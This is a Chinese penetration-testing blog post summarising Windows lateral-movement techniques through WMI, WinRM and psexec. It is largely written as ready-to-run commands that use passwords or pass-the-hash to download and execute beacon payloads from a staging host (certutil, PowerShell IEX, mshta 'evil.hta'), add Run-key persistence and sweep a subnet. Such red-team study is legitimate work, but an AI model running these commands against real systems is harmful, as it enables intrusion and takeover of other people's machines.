@@ -1,0 +1,583 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于内网横向移动的学习总结 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="关于内网横向移动的学习总结"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>关于内网横向移动的学习总结</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2020/08/21/关于内网横向移动的学习总结/" rel="bookmark">
+        <time class="entry-date published" datetime="2020-08-21T09:53:05.000Z">
+          2020-08-21
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​        当我们进入内网后，并且对当前主机的各种信息已经搜集完毕，接下来就到了最有意思的环节，横向移动。在这个环节，我们可以通过我们的操作获取多台主机的权限，本文将总结内网横向渗透中常用的姿势。</p>
+<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p><strong>什么是WMI?</strong></p>
+<p>​        WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，由一组强大的工具集合组成，用于管理本地或<strong>远程</strong>的 Windows 系统。</p>
+<p><strong>为什么要使用WMI？</strong></p>
+<p>​        使用WMI进行横向移动，默认不会留下系统日志，并且脚本无需写入磁盘，具有隐蔽性。</p>
+<span id="more"></span>
+
+<p><strong>如何使用WMI?</strong></p>
+<p>​        对于WMI的利用，可以使用windows自带的wmic命令来执行各种操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief 列出进程信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823225302723.png" alt="image-20200823225302723"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process call create &quot;calc.exe&quot;  创建进程</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230056479.png" alt="image-20200823230056479"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount list brief 列出当前账户信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230213681.png" alt="image-20200823230213681"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption 获取启动项中的信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823230935974.png" alt="image-20200823230935974"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief 查看启动的服务</span><br><span class="line">wmic service where &quot;name=&#x27;AppXSvc&#x27;&quot; call startservice 启动某个服务</span><br><span class="line">wmic service where &quot;name=&#x27;AppXSvc&#x27;&quot; call stopservice   停止某个服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231132116.png" alt="image-20200823231132116"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231144901.png" alt="image-20200823231144901"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231202869.png" alt="image-20200823231202869"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief  查看补丁</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231301814.png" alt="image-20200823231301814"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic ntdomain list brief 获取域控信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231626975.png" alt="image-20200823231626975"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version 获取安装的软件，获取的不一定全</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823231739063.png" alt="image-20200823231739063"></p>
+<p><strong>WMI横向渗透条件？</strong></p>
+<ul>
+<li>开启WMIC默认管理端口135端口</li>
+<li>拥有管理员权限</li>
+</ul>
+<p><strong>WMI横向渗透利用</strong></p>
+<p>1、使用WMIC利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.144 /user:administrator /password:Admin12345 PROCESS call create &quot;cmd.exe /c ipconfig &gt; c:\windows\temp\result.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823234153636.png" alt="image-20200823234153636"></p>
+<p>使用WMIC进行横向渗透是无法获取回显的，因此可以通过建立IPC连接，通过IPC读取执行结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\192.168.3.144\c$\windows\temp\result.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200823234529203.png" alt="image-20200823234529203"></p>
+<p>使用WMIC执行exe上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.144 /user:administrator /password:&quot;xxx&quot; PROCESS call create &quot;cmd /c certutil.exe -urlcache -split -f http://192.168.3.99/beacon.exe c:/windows/temp/windwn.exe &amp; c:/windows/temp/windwn.exe &amp; certutil.exe -urlcache -split -f http://192.168.3.99/beacon.exe delete&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824095347428.png" alt="image-20200824095347428"></p>
+<p>使用WMIC执行powershell上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NODE:192.168.3.144 /user:&quot;administrator&quot; /password:&quot;xxx&quot; PROCESS call create &quot;powershell -nop -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.3.99/beacon.ps1&#x27;);\&quot;&quot; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824100644862.png" alt="image-20200824100644862"></p>
+<p>使用WMIC修改注册表权限维持</p>
+<p>​        首先将我们生成的马放到边界主机上，使用IPC将马移动到目标主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.144\admin$ /user:&quot;administrator&quot; &quot;xxx&quot; &amp; xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.144\admin$\temp &amp; net use \\192.168.3.144\admin$ /del</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824101718854.png" alt="image-20200824101718854"></p>
+<p>​        操作注册表，将文件写入到启动项中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NODE:&quot;192.168.3.144&quot; /USER:&quot;administrator&quot; /PASSWORD:&quot;xxx&quot; process call create &quot;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v \&quot;shell\&quot; /t REG_SZ /d \&quot;C:\windows\temp\artifact.exe\&quot; /f&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824102054065.png" alt="image-20200824102054065"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824102157796.png" alt="image-20200824102157796"></p>
+<p>2、使用wmiexec.vbs利用</p>
+<p>​        直接使用原生的wmic利用有一个缺陷，就是不能获取返回的内容，使用wmiexe.vbs可以获取到执行的结果，其原理就是先将执行后的结果输出到文件中，再与目标建立IPC连接，查看文件的内容，因此这种利用方式不仅需要目标开启135，也需要开启445,否则无法获取执行后的结果。</p>
+<p>​        使用wmiexec.vbs执行命令并获取结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /cmd 192.168.3.144 administrator &quot;xxxx&quot; &quot;query user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824103002551.png" alt="image-20200824103002551"></p>
+<p>​        使用wmiexec获取半交互的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wmiexec.vbs /shell 192.168.3.144 administrator &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824103755336.png" alt="image-20200824103755336"></p>
+<p>3、使用impacket套件利用</p>
+<p>​        在windows下，有已经打包成exe的impacket利用套件，当我们仅仅得到hash而没有得到密码时，可以通过wmiexec.exe来进行横向移动。<strong>hash的值需要区分大小写，否则会执行失败</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes &quot;xxx:xxx&quot; administrator@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824111121993.png" alt="image-20200824111121993"></p>
+<p>​        也可以使用wmiexec.exe通过密码进行验证来执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe  administrator:xxx@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824120039093.png" alt="image-20200824120039093"></p>
+<p>​        也可以获取半交互的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe  administrator:xxx@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824120200887.png" alt="image-20200824120200887"></p>
+<p>4、使用Invoke-WMIExec利用</p>
+<p>​        当只有hash时，也可以通过Invoke-WMIExec来进行横向渗透，不过这种方式无法获取执行后的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#x27;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &quot;whoami&quot; -verbose&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824112842144.png" alt="image-20200824112842144"></p>
+<p>​        如果在cs上执行，需要将powershell的双引号转义一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#x27;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &#x27;whoami&#x27; -verbose&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824113324458.png" alt="image-20200824113324458"></p>
+<p>​     在目标可以出外网的情况下，可以使用cs生成一个hta文件，再远程加载hta文件达到上线的目的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#x27;);Invoke-WMIExec -Target 192.168.3.144  -Username administrator -Hash xxx -Command &#x27;mshta http://111.229.70.13:801/evil.hta&#x27; -verbose&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824114313078.png" alt="image-20200824114313078"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824114350510.png" alt="image-20200824114350510"></p>
+<p>​        我们也可以同时导入Invoke-TheHash.ps1和Invoke-WMIExec.ps1来探测同C段中用户hash是否相同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell &quot;&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\Users\jerry\Desktop\Invoke-WMIExec.ps1&#x27;);IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\Users\jerry\Desktop\Invoke-TheHash.ps1&#x27;);Invoke-TheHash -Type WMIExec -Target 192.168.3.0/24 -Username administrator -Hash xxx&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824115328865.png" alt="image-20200824115328865"></p>
+<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><p><strong>什么是winrm?</strong></p>
+<p>​        Web服务管理协议（WS-Management，Web Services-Management）是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备以及各种Web应用程序进行管理。而WinRM（<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">Windows Remote Management</a>）是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。</p>
+<p>​        winrm服务端工作在5985和5986端口上，winrm以SOAP格式来进行数据交换。</p>
+<p><strong>有什么利用条件？</strong></p>
+<ul>
+<li><p>在win2012以上才可以远程主机来管理</p>
+</li>
+<li><p>防火墙开放对5985和5986端口的连入</p>
+<p>可以在powershell下进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Test-WsMan 192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824141035101.png" alt="image-20200824141035101"></p>
+</li>
+</ul>
+<p><strong>winrm横向移动</strong></p>
+<p>1、使用winrm直接横向移动</p>
+<p>​        使用winrm在本地执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;calc.exe&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824141727865.png" alt="image-20200824141727865"></p>
+<p>​        使用winrm在远程主机上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;calc.exe&quot;&#125; -r:http://10.0.83.30:5985 -u:administrator -p:123456</span><br></pre></td></tr></table></figure>
+
+<p>​        直接使用会存在一个信任问题</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824142530029.png" alt="image-20200824142530029"></p>
+<p>​        可以通过如下命令添加信任</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Item WSMan:\localhost\Client\TrustedHosts -Value &quot;192.168.3.73&quot;</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *  信任任意的远程主机</span><br><span class="line">Get-Item WSMan:\localhost\Client\TrustedHosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824143736527.png" alt="image-20200824143736527"></p>
+<p>​        添加信任后，再使用winrm执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;calc.exe&quot;&#125; -r:http://192.168.3.73:5985 -u:administrator -p:xxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144154073.png" alt="image-20200824144154073"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144213829.png" alt="image-20200824144213829"></p>
+<p>2、使用自带的winrs横向渗透</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.73 -u:administrator -p:xxx &quot;query user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824144311792.png" alt="image-20200824144311792"></p>
+<p>​        获取交互shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:192.168.3.73 -u:administrator -p:xxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145743238.png" alt="image-20200824145743238"></p>
+<p>3、使用powershell横向渗透</p>
+<p>​        直接执行命令的方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName 192.168.3.73 -ScriptBlock &#123; query user &#125; -credential administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145045948.png" alt="image-20200824145045948"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145027678.png" alt="image-20200824145027678"></p>
+<p>​        获取交互shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName 192.168.3.73 -Credential administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824145336582.png" alt="image-20200824145336582"></p>
+<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>​        因为本地管理员具有创建，重启，修改二进制文件路径的权限，因此可以通过这种方式进行横向移动。</p>
+<p><strong>1、psexec横向移动</strong></p>
+<p>​        通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为”PSEXESVC”的二进制文件，然后通过psexec服务运行命令，运行结束后删除服务。</p>
+<p>利用说明：</p>
+<pre><code>    - 使用psexec需要开启admin$共享
+    - Psexec 连接目标时会创建PSEXESVC 服务，退出时删除PSEXESVC 服务，会在目标日志系统留下大量痕迹
+    -  通过Psexec获得交互式shell时，正常使用exit退出会删除目标机器上的PSEXESVC 服务，直接点 X 关闭可能导致目标服务无法删除。如果使用交互式shell执行阻塞的进程可能导出服务不能正常退出。
+    - Psexec 该工具支持socks代理
+</code></pre>
+<p>​    <strong>无ipc连接情况下</strong></p>
+<p>​        获取反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe  \\192.168.3.144 -u administrator -p xxx cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824154405301.png" alt="image-20200824154405301"></p>
+<p>​        执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.3.144 -u administrator -p xxx cmd.exe &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171320209.png" alt="image-20200824171320209"></p>
+<p>有ipc连接情况下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\192.168.3.144 cmd.exe</span><br><span class="line">psexec.exe \\192.168.3.144 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171717205.png" alt="image-20200824171717205"></p>
